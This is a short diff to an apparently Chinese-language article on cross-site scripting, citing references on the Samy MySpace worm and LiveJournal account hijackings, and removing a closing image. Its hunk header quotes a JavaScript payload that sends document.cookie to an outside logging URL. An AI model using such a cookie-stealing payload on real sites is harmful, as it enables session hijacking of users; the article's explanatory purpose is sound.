@@ -56,8 +56,3 @@ new Image().src="http://jehiah.com/_sandbox/log.cgi?c="+encodeURI(document.cooki
 - [萨米 (计算机蠕虫)](https://zh.wikipedia.org/wiki/%E8%90%A8%E7%B1%B3_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A0%95%E8%99%AB))
 - [Technical explanation of The MySpace Worm](http://samy.pl/popular/tech.html)
 - [Account Hijackings Force LiveJournal Changes](http://voices.washingtonpost.com/securityfix/2006/01/account_hijackings_force_livej.html)
-
-
-<div style="text-align: center;">
-<img style="width:30%;" src="https://blog.fundebug.com/images/qq_bug.JPG" />
-</div>
